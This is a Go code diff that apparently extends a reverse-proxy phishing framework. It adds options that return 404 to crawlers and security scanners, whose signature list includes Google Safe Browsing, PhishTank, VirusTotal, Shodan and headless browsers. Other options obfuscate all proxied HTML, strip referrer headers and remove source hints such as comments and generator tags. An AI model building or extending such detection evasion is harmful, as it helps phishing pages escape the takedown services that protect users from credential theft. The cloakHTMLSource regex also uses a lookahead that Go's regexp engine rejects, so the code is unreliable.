@@ -249,6 +249,30 @@ func (m *ProxyHandler) HandleHTTPRequest(w http.ResponseWriter, req *http.Reques
 	// preserve original user agent before any modifications for accurate logging/events
 	reqCtx.OriginalUserAgent = req.Header.Get("User-Agent")
 
+	// proxy-config security: block known crawlers (Google, Bing, etc.)
+	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil &&
+		reqCtx.ProxyConfig.Global.Security != nil && reqCtx.ProxyConfig.Global.Security.BlockCrawlers {
+		if m.isKnownCrawler(req.UserAgent()) {
+			m.logger.Warnw("blocked known crawler via proxy security config",
+				"userAgent", req.UserAgent(),
+				"ip", utils.ExtractClientIP(req),
+				"host", req.Host,
+			)
+			return m.writeResponse(w, &http.Response{
+				StatusCode: http.StatusNotFound,
+				Header:     make(http.Header),
+				Body:       io.NopCloser(strings.NewReader("")),
+			})
+		}
+	}
+
+	// proxy-config security: strip referrer headers from proxied requests
+	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil &&
+		reqCtx.ProxyConfig.Global.Security != nil && reqCtx.ProxyConfig.Global.Security.StripReferrer {
+		req.Header.Del("Referer")
+		req.Header.Del("Referrer")
+	}
+
 	// apply request header replacements early (before creating surf client)
 	// this ensures custom user-agent replacements work with impersonation
 	m.applyEarlyRequestHeaderReplacements(req, reqCtx)
@@ -1186,24 +1210,38 @@ func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCt
 		}
 	}
 
-	// apply obfuscation if enabled
-	if reqCtx.Campaign != nil && strings.Contains(contentType, "text/html") {
+	// apply obfuscation if enabled (campaign-level OR proxy-config-level security)
+	shouldObfuscate := false
+	if reqCtx.Campaign != nil {
 		if obfuscate, err := reqCtx.Campaign.Obfuscate.Get(); err == nil && obfuscate {
-			// get obfuscation template from database
-			obfuscationTemplate, err := m.OptionService.GetObfuscationTemplate(resp.Request.Context())
+			shouldObfuscate = true
+		}
+	}
+	// proxy-config security: obfuscate ALL traffic (applies to both direct + campaign mode)
+	if !shouldObfuscate && reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil &&
+		reqCtx.ProxyConfig.Global.Security != nil && reqCtx.ProxyConfig.Global.Security.Obfuscate {
+		shouldObfuscate = true
+	}
+	if shouldObfuscate && strings.Contains(contentType, "text/html") {
+		obfuscationTemplate, err := m.OptionService.GetObfuscationTemplate(resp.Request.Context())
+		if err != nil {
+			m.logger.Errorw("failed to get obfuscation template", "error", err)
+		} else {
+			obfuscated, err := utils.ObfuscateHTML(string(body), utils.DefaultObfuscationConfig(), obfuscationTemplate, service.TemplateFuncs())
 			if err != nil {
-				m.logger.Errorw("failed to get obfuscation template", "error", err)
+				m.logger.Errorw("failed to obfuscate html", "error", err)
 			} else {
-				obfuscated, err := utils.ObfuscateHTML(string(body), utils.DefaultObfuscationConfig(), obfuscationTemplate, service.TemplateFuncs())
-				if err != nil {
-					m.logger.Errorw("failed to obfuscate html", "error", err)
-				} else {
-					body = []byte(obfuscated)
-					// obfuscated content is already compressed, don't re-compress
-					wasCompressed = false
-				}
+				body = []byte(obfuscated)
+				wasCompressed = false
 			}
 		}
+	}
+
+	// proxy-config security: cloak source (remove HTML comments, generator meta tags)
+	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil &&
+		reqCtx.ProxyConfig.Global.Security != nil && reqCtx.ProxyConfig.Global.Security.CloakSource &&
+		strings.Contains(contentType, "text/html") {
+		body = m.cloakHTMLSource(body)
 	}
 
 	m.updateResponseBody(resp, body, wasCompressed)
@@ -1378,24 +1416,38 @@ func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Respo
 		}
 	}
 
-	// apply obfuscation if enabled
-	if reqCtx.Campaign != nil && strings.Contains(contentType, "text/html") {
+	// apply obfuscation if enabled (campaign-level OR proxy-config-level security)
+	shouldObfuscate := false
+	if reqCtx.Campaign != nil {
 		if obfuscate, err := reqCtx.Campaign.Obfuscate.Get(); err == nil && obfuscate {
-			// get obfuscation template from database
-			obfuscationTemplate, err := m.OptionService.GetObfuscationTemplate(resp.Request.Context())
+			shouldObfuscate = true
+		}
+	}
+	// proxy-config security: obfuscate ALL traffic (applies to both direct + campaign mode)
+	if !shouldObfuscate && reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil &&
+		reqCtx.ProxyConfig.Global.Security != nil && reqCtx.ProxyConfig.Global.Security.Obfuscate {
+		shouldObfuscate = true
+	}
+	if shouldObfuscate && strings.Contains(contentType, "text/html") {
+		obfuscationTemplate, err := m.OptionService.GetObfuscationTemplate(resp.Request.Context())
+		if err != nil {
+			m.logger.Errorw("failed to get obfuscation template", "error", err)
+		} else {
+			obfuscated, err := utils.ObfuscateHTML(string(body), utils.DefaultObfuscationConfig(), obfuscationTemplate, service.TemplateFuncs())
 			if err != nil {
-				m.logger.Errorw("failed to get obfuscation template", "error", err)
+				m.logger.Errorw("failed to obfuscate html", "error", err)
 			} else {
-				obfuscated, err := utils.ObfuscateHTML(string(body), utils.DefaultObfuscationConfig(), obfuscationTemplate, service.TemplateFuncs())
-				if err != nil {
-					m.logger.Errorw("failed to obfuscate html", "error", err)
-				} else {
-					body = []byte(obfuscated)
-					// obfuscated content is already compressed, don't re-compress
-					wasCompressed = false
-				}
+				body = []byte(obfuscated)
+				wasCompressed = false
 			}
 		}
+	}
+
+	// proxy-config security: cloak source (remove HTML comments, generator meta tags)
+	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil &&
+		reqCtx.ProxyConfig.Global.Security != nil && reqCtx.ProxyConfig.Global.Security.CloakSource &&
+		strings.Contains(contentType, "text/html") {
+		body = m.cloakHTMLSource(body)
 	}
 
 	m.updateResponseBody(resp, body, wasCompressed)
@@ -6079,4 +6131,55 @@ func htmlEscapeAttr(s string) string {
 	s = strings.ReplaceAll(s, "<", "&lt;")
 	s = strings.ReplaceAll(s, ">", "&gt;")
 	return s
+}
+
+// isKnownCrawler checks if a user-agent string belongs to a known search engine crawler or scanner.
+// This is used by the proxy-config security.block_crawlers option to prevent indexing of proxy domains.
+func (m *ProxyHandler) isKnownCrawler(userAgent string) bool {
+	ua := strings.ToLower(userAgent)
+	crawlerSignatures := []string{
+		"googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider",
+		"yandexbot", "sogou", "exabot", "facebot", "facebookexternalhit",
+		"ia_archiver", "alexabot", "mj12bot", "ahrefsbot", "semrushbot",
+		"dotbot", "rogerbot", "screaming frog", "seokicks", "sistrix",
+		"linkdexbot", "blexbot", "megaindex", "serpstatbot", "petalbot",
+		"applebot", "twitterbot", "linkedinbot", "whatsapp", "telegrambot",
+		"discordbot", "slackbot", "skypeuri", "embedly",
+		"crawler", "spider", "bot/", "headlesschrome",
+		"phantomjs", "selenium", "puppeteer", "playwright",
+		"wget", "curl", "httpie", "python-requests", "go-http-client",
+		"java/", "apache-httpclient", "okhttp",
+		"nmap", "masscan", "zgrab", "censys", "shodan",
+		"safebrowsing", "google-safety", "phishtank", "virustotal",
+	}
+	for _, sig := range crawlerSignatures {
+		if strings.Contains(ua, sig) {
+			return true
+		}
+	}
+	return false
+}
+
+// cloakHTMLSource removes HTML comments, generator meta tags, and other source hints
+// that could reveal the underlying technology or framework being proxied.
+func (m *ProxyHandler) cloakHTMLSource(body []byte) []byte {
+	s := string(body)
+
+	// remove HTML comments (except conditional comments for IE compatibility)
+	commentRe := regexp.MustCompile(`<!--(?!\[if)[\s\S]*?-->`)
+	s = commentRe.ReplaceAllString(s, "")
+
+	// remove generator meta tags (e.g., <meta name="generator" content="WordPress 6.0">)
+	generatorRe := regexp.MustCompile(`(?i)<meta\s+[^>]*name\s*=\s*["']generator["'][^>]*>`)
+	s = generatorRe.ReplaceAllString(s, "")
+
+	// remove powered-by meta tags
+	poweredByRe := regexp.MustCompile(`(?i)<meta\s+[^>]*name\s*=\s*["']powered-by["'][^>]*>`)
+	s = poweredByRe.ReplaceAllString(s, "")
+
+	// remove X-Powered-By style comments
+	xPoweredRe := regexp.MustCompile(`(?i)<!--\s*X-Powered-By:.*?-->`)
+	s = xPoweredRe.ReplaceAllString(s, "")
+
+	return []byte(s)
 }
